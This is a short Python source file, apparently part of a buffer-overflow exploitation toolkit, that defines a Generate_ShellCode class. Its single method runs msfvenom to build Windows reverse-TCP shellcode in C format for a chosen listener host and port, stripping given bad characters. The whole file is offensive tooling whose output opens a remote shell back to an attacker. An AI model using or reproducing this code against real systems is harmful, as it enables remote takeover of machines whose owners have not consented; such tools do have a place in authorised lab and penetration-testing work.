from BOF import BOF


class Generate_ShellCode(BOF):

    # Constructor
    def __init__(self):
        super().__init__()  # Call to superclass

    def generateShellCode(self, lhost, lport, badchars):
        BOF.run_cmd(self, f'msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -f c -a x86 -b "{badchars}"')
